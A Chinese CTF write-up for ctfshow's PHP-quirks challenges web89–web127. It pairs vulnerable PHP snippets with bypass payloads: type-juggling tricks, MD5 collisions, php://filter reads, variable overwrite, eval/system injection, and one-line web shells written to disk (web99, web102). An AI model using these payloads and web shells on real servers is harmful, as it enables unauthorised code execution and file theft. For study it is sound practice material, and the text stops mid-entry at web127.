---
title: Web入门_php特性
author: Creexile
date: 2024-07-24
lastMod: 2025-04-10
summary: '除了部分Web都挺萌新的'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [RCE, PHP, 绕过, CTF]
---

# php特性

---

web89-150, web150_plus

## web89

- 描述: 开始php特性系列了，师傅们，冲冲冲！

```php
if(preg_match("/[0-9]/", $num)){
    die("no no no!");
}
if(intval($num)){
    echo $flag;
}
```

`inteval()`函数在官方文档中写有: 失败返回0, 空的array返回0, 非空的array返回1;

`preg_match()`函数在传入数组会直接返回0; 于是payload:

```
?num[]=1
```

## web90

- 描述: 同上

```php
    if($num==="4476"){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
```

`intval( $value, $base )`在官方文档中定义为: 如果base是0, 通过检测value的格式来决定使用的进制

![image-20240708151442915](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240708151442915.png)

于是我们可以构造以下payload:

```
?num=010574
?num=0x117c
```

而且因为我们提交的参数值默认就是字符串类型, 还可以随便加上一个字符

```
?num=4476a
?num=4476%23
```

## web91

- 描述: 同上

> 本题为[换行解析漏洞](https://blog.csdn.net/qq_46091464/article/details/108278486), 可以先查看此文章再做题

```php
if(preg_match('/^php$/im', $a)){
    if(preg_match('/^php$/i', $a)){
        echo 'hacker';
    }
    else{
        echo $flag;
    }
}
else{
    echo 'nonononono';
}
```

`/i`表示匹配大小写, `/m`表示多行匹配 , "行首"元字符 `^` 仅匹配字符串的开始位置, 而"行末"元字符 `$` 仅匹配字符串末尾,字符`^`和`$`同时使用时，表示精确匹配，需要匹配到以php开头和以php结尾的字符串才会返回true; 所以本关程序是要求我们多行匹配到php但是单行匹配不到php。

所以只需要加上一个换行符`%0a`就能解决这个问题, payload

```
?cmd=1%0aphp
```

## web92

- 描述: 同上

```php
    if($num==4476){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
```

解题方法: 可以用16进制和8进制绕过, 但是这里优先介绍新的方法:

`intval($value, $base)`函数如果`$base`为0则`$value`中存在字母的话遇到字母就停止读取, 但是只增加一个字母是不能绕过弱等于判断

而e作为科学计数法的特征可以不用于科学记数法(被截断了), 所以我们构造的payload为

```
?num=4476e2
```

## web93

- 描述: 同上

```php
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
```

同web90, 直接用8进制就能绕过了, 还可以用小数(通过`intval()`函数变为int类型)

```
?num=010574
?num=4476.1
```

## web94

- 描述: 同上

```php
    if($num==="4476"){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(!strpos($num, "0")){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
```

在web93的基础上过滤了开头为0的数字, 这样的话就不能使用进制转换来进行操作

```
strpos() - 函数查找字符串在另一字符串中第一次出现的位置。
stripos() - 查找字符串在另一字符串中第一次出现的位置, 不区分大小写
strripos() - 查找字符串在另一字符串中最后一次出现的位置, 不区分大小写
strrpos() - 查找字符串在另一字符串中最后一次出现的位置, 区分大小写
```

我们可以使用小数点来进行操作, 这样通过intval()函数就可以变为int类型的4476; 还可以利用前面加空格或者+的方式规避第一个字符是0的问题

```
?num=4476.0
?num= 010574
?num=+4476.0
```

## web95

- 描述: 同上

```php
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]|\./i", $num)){
        die("no no no!!");
    }
    if(!strpos($num, "0")){
        die("no no no!!!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
```

过滤掉了点, 同时将强等于变为弱等于, 构造的payload如下

```
?num= 010574
?num=+010574
```

## web96

- 描述: 同上

```php
    if($_GET['u']=='flag.php'){
        die("no no no");
    }else{
        highlight_file($_GET['u']);
    }
```

反正都是当前目录下的文件, 客气些什么. payload:

```
?u=./flag.php
?u=php://filter/resource=flag.php
?u=/var/www/html/flag.php
```

## web97

- 描述: 同上

```php
if (isset($_POST['a']) and isset($_POST['b'])) {
	if ($_POST['a'] != $_POST['b'])
		if (md5($_POST['a']) === md5($_POST['b']))
			echo $flag;
}else{
	print 'Wrong.';
}
```

a和b不相同但是md5值相同, 经典的数组绕过, 或者是直接构造相等的md5值(fastcoll_v1.0.0.5)

md5和sha1对一个数组进行加密将返回NULL, 而`NULL===NULL`返回true, 所以可绕过判断

```
a[]=1&b[]=2
或者
a=flag%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%17%28%22WT%96g+%00%E6R%006I%FFL%0D%13u%07W%16%02%D4%15BCR%93%2F%16%D0V%F3%F7%E0%DC%0BI%21K%0E%C6%01%F0%D9%E3%408v%9BK%60%E0%95%8D%AF%28%1Fr%DD%E15%FA%23%9BZl%92b%B2%ED%93%E4%0D%8C%F7%FF%0F%1F%B4%ED%B1d%17F%1E1%D3%1AvK%ECF%DE%EB%EEm%9EX%F4%16%E4%D0%C82TWo%24fj%11Oap%CB%CCNL%96%E0%5D%18%19%8Ds%DE&b=flag%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%17%28%22WT%96g+%00%E6R%006I%FFL%0D%13u%87W%16%02%D4%15BCR%93%2F%16%D0V%F3%F7%E0%DC%0BI%21K%0E%C6%01%F0Y%E4%408v%9BK%60%E0%95%8D%AF%28%1F%F2%DD%E15%FA%23%9BZl%92b%B2%ED%93%E4%0D%8C%F7%FF%0F%1F%B4%ED%B1%E4%17F%1E1%D3%1AvK%ECF%DE%EB%EEm%9EX%F4%16%E4%D0%C82TWo%A4ej%11Oap%CB%CCNL%96%E0%5D%98%19%8Ds%DE
```

## web98

- 描述: 同上

```php
$_GET?$_GET=&$_POST:'flag';
$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);
```

只要有输入的GET参数就将POST方法的值赋值给GET方法(修改了get方法的地址), 如果GET进来的HTTP_FLAG值是flag，那么输出$flag，要不然输源代码

但但是我们可以直接控制POST的值, 于是我们可以用POST传参`HTTP_FLAG=flag`

> 虽然注意到直接利用GET传入`_`是不可行的, 但是经过测试发现传入任何东西都行, 例如`?1`都能用

![image-20240722225734752](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240722225734752.png)

## web99

- 描述: 同上

```php
$allow = array();
for ($i=36; $i < 0x36d; $i++) {
    array_push($allow, rand(1,$i));
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
    file_put_contents($_GET['n'], $_POST['content']);
}
```

源代码: 生成一个随机数数组, 如果传入的n在数组中, 将通过POST请求传递的content数据写入由URL中n参数指定的文件中

`in_array()`函数有漏洞, 没有设置第三个参数时为弱类型比较, 就可以形成自动转换eg: n=1.php自动转换为1

所以可以通过GET传入1.php然后利用content传入一句话木马进行写马, 直接访问即可

```
GET: ?n=1.php
POST: content=<?php @eval($_POST['cmd']);?>
```

## web100

- 描述: 后面可能停留几天，将条目理顺一些

```php
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\;/", $v2)){
        if(preg_match("/\;/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
}
```

检查v1,v2,v3是否都是数字, 且v2不包含分号, 但v3包含分号时, 执行`$v2('ctfshow')$v3`

已知PHP中运算符优先级的排列为

```
 &&  ||  =   and   or
 //从左往右，从高到低
```

所以判断是否都是数字的时候, 仅仅只能判断v1是否是数字, and后面全都被忽略了, 所以可以确定v1和v3

现在可以执行命令或者注释掉后面代码再自己构造

**第一种方法**: 自己构造执行(构造一句话等, 解法为非预期):

```
?v1=1&v2=eval($_POST[cmd])?>%23&v3=;
?v1=1&v2=echo `ls`?>&v3=;
# 直接执行也行
```

flag不在flag36d.php中, 在ctfshow.php

![image-20240722235023637](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240722235023637.png)

```html
<!--?php
class ctfshow{
	var $dalaoA,$dalaoB,$flag_is_fa150d4a0x2d78570x2d49cc0x2d8c520x2de8bcca93ccdb;
}
#('ctfshow');-->
```

> 至于为什么看着不像flag, 因为`-`在这里表示为`0x2d`, 替换一下就好了

**第二种方法**: php反射或者相关函数(var_dump函数)

```
?v1=21&v2=var_dump($ctfshow)/*&v3=*/;		# 官方解
?v1=1&v2=var_dump($ctfshow)&v3=;
?v1=1&v2=print_r($ctfshow)?>&v3=;
?v1=1&v2=var_export($ctfshow)?>&v3=;
?v1=1&v2=echo new ReflectionClass&v3=;
# 实际执行: eval("echo new ReflectionClass('ctfshow');");
```

php反射这个工具允许你在运行时检查对象的属性和方法, 甚至可以调用它们; 反射 API 由一系列类组成, 这些类使得PHP代码能够获取关于类、接口、函数、方法和扩展的信息, 并在运行时动态调用它们; 常见的反射类有:

- `ReflectionClass`: 用于检查类, 可以获取类的名称、父类、接口、方法、属性等信息
- `ReflectionMethod`: 用于检查类的方法，可以获取方法的名称、参数、访问级别等信息，并可以调用该方法
- `ReflectionProperty`: 用于检查类的属性，可以获取属性的名称、访问级别等信息，并可以读取或设置属性值
- `ReflectionFunction`: 用于检查函数，包括内置函数和用户定义的函数

```php
# 示例
<?php
class MyClass {
    public $publicProperty = 'Public';
    protected $protectedProperty = 'Protected';
    private $privateProperty = 'Private';

    public function myPublicMethod() {
        return 'Public method';
    }

    protected function myProtectedMethod() {
        return 'Protected method';
    }

    private function myPrivateMethod() {
        return 'Private method';
    }
}

$reflectionClass = new ReflectionClass('MyClass');

# 获取类的属性
$properties = $reflectionClass->getProperties();
foreach ($properties as $property) {
    echo $property->getName() . "\n";
}

# 调用公共方法
$instance = $reflectionClass->newInstance();
$method = $reflectionClass->getMethod('myPublicMethod');
echo $method->invoke($instance) . "\n";

# 尝试调用受保护或私有方法（这通常不是一个好的做法，除非有特别需要）
$protectedMethod = $reflectionClass->getMethod('myProtectedMethod');
$protectedMethod->setAccessible(true); // 设置为可访问
echo $protectedMethod->invoke($instance) . "\n";

# 类似地，可以调用私有方法
?>
```

而`var_dump()`是一个PHP函数,用于输出变量的详细信息; 当您使用`var_dump()`打印一个变量时, 它会显示变量的类型和值; 如果变量是一个数组或对象, `var_dump()`还会递归地显示数组的元素或对象的属性, 以及这些元素的类型

`print_r`和`var_export`都是输出内容的函数

> 反射类(Reflection Classes)是PHP反射API的一部分, `var_dump()`是一个 PHP 函数

## web101

- 描述: 修补100题非预期,替换0x2d
- 提示: 最后一位需要爆破16次，题目给的flag少一位

这里的非预期指的是`var_dump()`和执行一句话马的两个解法

```php
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/", $v2)){
        if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
}
```

反射类还是可以用的(flag是变量名):

```
?v1=1&v2=echo new ReflectionClass&v3=;
```

但是你说的对, 第二种解法是序列化:

```
?v1=1&v2=echo(serialize(new%20ctfshow&v3=));
```

## web102

- 描述: 换个姿势

```php
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    file_put_contents($v3,$str);
}
else{
    die('hacker');
}
```

判断v2和v3是否都是数字(仅生效v2), 在v2中截取从第三个字符开始的子字符串赋值给s, 将s作为参数传入v1指定的函数, 将函数的返回值赋给变量str; 最后将str的返回值写入到以v3命名的文件中

`call_user_func` 是 PHP 中的一个函数，它允许你调用一个回调函数，并且动态地将参数传递给该回调函数

```php
function myFunction($name) {
    echo "Hello, " . $name . "!";
}

call_user_func("myFunction", "World");
// 输出: Hello, World!
```

`file_put_contents`作为文件包含利用点刚在web87见过, 第一个参数是文件名，第二个参数是需要写进文件中的内容, 文件名支持伪协议

所以v1要是一个函数, v2是一个纯数字组成的字符串, v3是一个文件名或用伪协议(我用伪协议)

利用`hex2bin`可以将16进制转换为ascii码, 所以`v1=hex2bin`; v3伪协议, 所以`v3=php://filter/write=convert.base64-decode/resource=shell.php`

v2就是将一句话木马进行base64编码后再进行十六进制编码, 注意`substr`的字符截取从0开始

```
原: <?=`cat *`;
base64: PD89YGNhdCAqYDs=	# 如果出现=是可以去掉的, 填充不影响加解密
hex(None): 5044383959474e6864434171594473
```

> e会被当作科学记数法的标志, 所以这个字符串依然是数字

所以payload如下, 让问shell.php即可

```
GET: v2=005044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=shell.php
POST: v1=hex2bin
```

如果是PHP5,则可以不用伪协议; payload如下:

> php5中is_numeric函数识别16进制数，而php7不识别16进制数

```
v2=003c3f3d636174202a3b&v3=1.php
post:v1=hex2bin
```

## web103

- 描述: 换个姿势

```php
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    if(!preg_match("/.*p.*h.*p.*/i",$str)){
        file_put_contents($v3,$str);
    }
    else{
        die('Sorry');
    }
}
else{
    die('hacker');
}
```

上题的基础上给v2加了一层过滤, 用于过滤在任何位置出现的.php, v2参数路径如下:

hex -> substr()+call_user_func() -> base64 -> preg_match() -> file_put_contents()

不过很显然, base64加密后不存在.php这种东西, 所以继续用上一题payload即可

## web104

- 描述: 同上

```php
if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2)){
        echo $flag;
    }
}
```

你认为是sha1碰撞, 但是明显没有判断是否相等, 传入相同的东西给v1和v2就可以了

或者sha1和md5一样不能处理数组, 那就传入数组即可

还有0e绕过

```
md5：
240610708:0e462097431906509019562988736854
QLTHNDT:0e405967825401955372549139051580
QNKCDZO:0e830400451993494058024219903391
PJNPDWY:0e291529052894702774557631701704
NWWKITQ:0e763082070976038347657360817689
NOOPCJF:0e818888003657176127862245791911
MMHUWUV:0e701732711630150438129209816536
MAUXXQC:0e478478466848439040434801845361

sha1：
10932435112: 0e07766915004133176347055865026311692244
aaroZmOk: 0e66507019969427134894567494305185566735
aaK1STfY: 0e76658526655756207688271159624026011393
aaO8zKZF: 0e89257456677279068558073954252716165668
aa3OFF9m: 0e36977786278517984959260394024281014729
0e1290633704: 0e19985187802402577070739524195726831799
```

## web105

- 描述: 同上

```php
$error='你还想要flag嘛？';
$suces='既然你想要那给你吧！';
foreach($_GET as $key => $value){
    if($key==='error'){
        die("what are you doing?!");
    }
    $$key=$$value;
}foreach($_POST as $key => $value){
    if($value==='flag'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
if(!($_POST['flag']==$flag)){
    die($error);
}
echo "your are good".$flag."\n";
die($suces);
```

php的变量覆盖, 直接将用户输入用作变量名, 可能导致变量覆盖问题

检查GET传参key不等于error的时候执行`$$key=$$value`, 意为"一个变量其名称由`$key`的值决定", value同理; 检查POST传参value不等于flag的时候执行相同操作, 最后检查传入的flag是都等于`$flag`, 如果是, 输出flag

因为变量覆盖可以是任意的, 可以利用判定失败中的`die($error)`, 利用这一点输出flag, payload:

```
GET: ?suces=flag
POST: error=suces
# 或
GET: ?1=flag
POST: error=1
```

也可以用`die($suces)`, 将`$flag`赋值给`$suces`, 然后赋值`$flag`为空即可满足`$_POST['flag']==$flag` payload:

```
GET: ?suces=flag&flag=
# 或
GET: ?suces=flag
POST: flag=
```

## web106

- 描述: 同上

```php
if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2) && $v1!=$v2){
        echo $flag;
    }
}
```

判断加回来了, 那就用数组和0e绕过就行了

## web107

- 描述: 同上

```php
if(isset($_POST['v1'])){
    $v1 = $_POST['v1'];
    $v3 = $_GET['v3'];
       parse_str($v1,$v2);
       if($v2['flag']==md5($v3)){
           echo $flag;
       }
}
```

`parse_str`函数将字符串`$v1`解析为变量并存储到数组`$v2`中, 从解析后的数组`$v2`中获取的flag参数值, 检查该参数是否等于`$v3`经过md5加密的值, 满足条件输出flag

```php
parse_str("name=John&age=30", $output);
print_r($output);
```

输出如下

```
Array ( [name] => John [age] => 30 )
```

本题完全不用绕过乱七八糟的东西, payload:

```
GET: ?v3=240610708
POST: v1=flag=0
```

## web108

- 描述: 同上

```php
include("flag.php");
if (ereg ("^[a-zA-Z]+$", $_GET['c'])===FALSE)  {
    die('error');
}
//只有36d的人才能看到flag
if(intval(strrev($_GET['c']))==0x36d){
    echo $flag;
}
```

> `ereg`函数与`preg_match`都是正则, 在PHP 5.3.0后已被废弃, 且不支持强比较(但是本题确实有用)

用正则判断参数c中是否包含大小写字母, 为否则结束程序; 然后用 `strrev` 反转参数 `c` 的值, 然后使用 `intval` 将结果转换为整数, 并与十六进制数 `0x36d`(十进制为877)进行比较; 这意味着, 为了通过这个检查, 用户需要提供一个字符串, 该字符串反转后的整数表示必须等于877, 但是显然没有这样的字符串

那么只能绕过`ereg`函数, 随便一搜就能看到有%00截断漏洞

> `ereg`函数用指定的模式搜索一个字符串中指定的字符串, 如果匹配成功返回true, 否则返回false; 搜索字母的字符是大小写敏感的

所以payload为:

```
?c=a%00778
```

## web109

- 描述: 换个姿势

```php
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){
            eval("echo new $v1($v2());");
    }
}
```

只检查了v1和v2是否存在以及是否包含了字母, 随后就是eval执行命令: 创建一个名为`$v1`的类的实例并且调用名称为`$v2`的方法

这里我们可以利用魔术方法`__toString`和异常处理机制执行任意代码: 因为是`echo new class`, 将类当成字符串输出; 很多**PHP内置类**(如Exception, CachingIterator, ReflectionClass)都实现了`__toString`

> [Exception](https://geek-docs.com/php/php-exception-handling/php-exception-class.html), [CachingIterator](https://www.php.net/manual/zh/class.cachingiterator.php)和[ReflectionClass](https://www.php.net/manual/zh/class.reflectionclass.php)类的部分解释, 可以知道部分方法由`__toString`触发

所以payload:

```
?v1=Exception&v2=system('tac fl36dg.txt')
?v1=CachingIterator&v2=system('tac fl36dg.txt')
?v1=ReflectionClass&v2=system('tac fl36dg.txt')
# 问就是cat还得翻翻源码
```

## web110

- 描述: 我报警了

```php
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v2)){
            die("error v2");
    }
    eval("echo new $v1($v2());");
}
```

过滤基本剩下字母, 但是你说的对, 还是得用内置类: 利用FilesystemIterator获取指定目录下的所有文件(接受一个路径作为参数), 而获取当前路径的函数中, `getcwd`不需要参数, `getchwd`函数会返回当前工作目录

所以构造如下:

```
?v1=FilesystemIterator&v2=getcwd
# 本目录下有fl36dga.txt
```

没有后续了, 可以直接访问的

## web111

- 描述: 变量覆盖

```php
function getFlag(&$v1,&$v2){
    eval("$$v1 = &$$v2;");
    var_dump($$v1);
}
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v2)){
            die("error v2");
    }
    if(preg_match('/ctfshow/', $v1)){
            getFlag($v1,$v2);
    }
}
```

显然`eval("$$v1 = &$$v2;");`会出现变量覆盖问题, 但是要求`$v1`中包含字符串ctfshow才会调用, 所以只能构造`$v2`

因为我们并不知道flag在哪个变量里面, 所以直接调用超全局变量`$GLOBALS`: `$GLOBALS`是PHP的一个超级全局变量组, 包含了全部变量的全局组合数组, 变量的名字就是数组的键

所以payload:

```
?v1=ctfshow&v2=GLOBALS
```

> 就算知道了, 可是flag是在flag.php中的, 对于`getFlag()`是外部变量, 还是不能直接赋值给`$ctfshow`

## web112

- 描述: 函数绕过

```php
function filter($file){
    if(preg_match('/\.\.\/|http|https|data|input|rot13|base64|string/i',$file)){
        die("hacker!");
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
}
```

`is_file`函数用于检查指定的文件是否是常规的文件, 如果是, 则返回TRUE; 而既要通过`is_file`函数的检测, 还要通过`highlight_file`得到flag, 那只有伪协议读取文件

过滤了一些过滤器, 那就不使用过滤器, payload:

```
?file=php://filter/resource=flag.php
```

或者塞一些正则匹配之外的过滤器

```
php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
php://filter/read=convert.quoted-printable-encode/resource=flag.php
```

官方还给了一种伪协议:

```
compress.zlib://flag.php
```

[他人博客](https://www.cnblogs.com/zzjdbk/p/13030717.html)解析

## web113

- 描述: 函数绕过

```php
function filter($file){
    if(preg_match('/filter|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
        die('hacker!');
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
}
```

增加了过滤filter, 上一题给出了一种方法

```
compress.zlib://flag.php
```

官方预期解为

```
?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```

其中`/proc/self/root`是Linux系统中一个特殊的符号链接, 它始终指向当前进程的根目录; 由于目录溢出导致is_file无法正确解析, 认为这不是一个文件, 返回FALSE

## web114

- 描述: 同上

```php
function filter($file){
    if(preg_match('/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
        die('hacker!');
    }else{
        return $file;
    }
}
$file=$_GET['file'];
echo "师傅们居然tql都是非预期 哼！";
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
}
```

你怎么又回来了, 那就用伪协议吧

```
?file=php://filter/resource=flag.php
```

## web115

```php
function filter($num){
    $num=str_replace("0x","1",$num);
    $num=str_replace("0","1",$num);
    $num=str_replace(".","1",$num);
    $num=str_replace("e","1",$num);
    $num=str_replace("+","1",$num);
    return $num;
}
$num=$_GET['num'];
if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){
    if($num=='36'){
        echo $flag;
    }else{
        echo "hacker!!";
    }
}else{
    echo "hacker!!!";
}
```

`str_replace(find,replace,string,count)`函数替换字符串中的一些字符, 区分大小写; 题中替换了一些常见的其他形式的数字

`trim(string,charlist)`函数移除字符串两侧的空白字符或其他预定义字符, 因为第二个参数没有定义, 所以移除以下所有内容:

```
"\0" - NULL
"\t" - 制表符
"\n" - 换行
"\x0B" - 垂直制表符
"\r" - 回车
" " - 空格
```

要求在经过过滤函数前传入的`$num`不能是36, 经过过滤后要等于36

`trim`函数并没有过滤换页符(%0c), 如果利用换页符构造, `filter`函数也不会生效, 所以构造:

```
?num=%0c36
```

%0c在前面的原因是还需要绕过`is_numeric`, 此函数可以在数字前面加上空格或者等效于空格(%09)的进行绕过

> 注意`!==`和`===`都是强等于, 而有类似空格的在数字前面, 都不会强等于数字

后面的`filter`是弱比较, 经过类型转换后变灰了36, 可以通过, 所以这就是payload了

## web123

- 描述: 突破函数禁用

```php
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?/", $c)&&$c<=18){
         eval("$c".";");
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
```

首先是经典的传入`_`要用`[`替代(传入的变量名如果包含空格, 加号, 左中括号会被转化为下划线): 网站默认会把点转换为下划线, 对不符合规则的变量只转换一次, 而`CTF_SHOW.COM`里有两个不规则的字符, 所以需要写成`CTF[SHOW.COM`

`$fl0g`是不能传参的, 所以利用只能是`eval("$c".";");`, 使`$c`等于`echo $flag;`即可, 刚好小于18

payload如下:

```
CTF_SHOW=1&CTF[SHOW.COM=1&fun=echo $flag
```

## web125

- 描述: php特性

```php
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i", $c)&&$c<=16){
         eval("$c".";");
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
```

现在`$fl0g`可控了, 但是是要求不能有`$fl0g`; `$c`长度限制变成了16且增加了新的过滤

既然POST走不通那就走GET, payload:

```
GET: ?1=flag.php
POST: CTF_SHOW=&CTF[SHOW.COM=&fun=highlight_file($_GET[1])
```

## web126

- 描述: 同上

```php
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i", $c) && strlen($c)<=16){
         eval("$c".";");
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
```

新增的匹配导致输出函数和GET方法都不能使用了, 那考虑满足`$fl0g`的条件利用变量覆盖获取flag

可能利用到的函数:

`extract($array)`函数, 从数组中将变量导入到当前的符号表, 可以实现变量覆盖(但是有c, 被过滤了); `parse_str($str)`函数, 将字符串解析成多个变量, 可用; `assert()`执行php语句, 可用

那怎么传入 fl0g=flag_give_me, 只能是`$a=$_SERVER['argv'];`

> `$_SERVER['argv']`在Web模式下默认是不可用的, 主要用于处理命令行参数
>
> Web模式下如果要`$_SERVER['argv']`能接受GET的传参, 需要在php.ini中设置`register_argc_argv=On`, 此时`$_SERVER['argv'][0] = $_SERVER['QUERY_STRING'];`, 可以利用GET传入参数, 格式和命令行相同, 空格隔开参数

进行本地测试可以利用以下代码:

```php
<?php
error_reporting(0);
// 检查 register_argc_argv 是否打开
if (ini_get('register_argc_argv')) {
    echo "register_argc_argv 已打开。<br>";
} else {
    echo "register_argc_argv 未打开。<br>";
}
var_dump($_SERVER);
?>
```

然后传入`?a=b+c=d`, 查看输出是否是argv中有两个元素a=b, c=d

由此构建payload:

```
GET:?a=1+fl0g=flag_give_me
POST:CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])
```

或者用`assert`甚至`eval`

```
GET:?$fl0g=flag_give_me
POST:CTF_SHOW=&CTF[SHOW.COM=&fun=assert($a[0])

GET:?$fl0g=flag_give_me;	# eval内部语句要有结尾
POST:CTF_SHOW=&CTF[SHOW.COM=&fun=eval($a[0])
```

## web127

- 描述:

```php
include("flag.php");
highlight_file(__FILE__);
$ctf_show = md5($flag);
$url = $_SERVER['QUERY_STRING'];

//特殊字符检测
function waf($url){
    if(preg_match('/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\{|\;|\:|\[|\]|\}|\'|\"|\<|\,|\>|\.|\\\|\//', $url)){
        return true;
    }else{
        return false;
    }
}

if(waf($url)){
    die("嗯哼？");
}else{
    extract($_GET);
}

if($ctf_show==='ilove36d'){
    echo $flag;
}
```

`extract`函数从数组中将变量导入到当前的符号表, 就是如果传入的是?a=1, 就会变成程序中的$a=1

难绷官方警告:

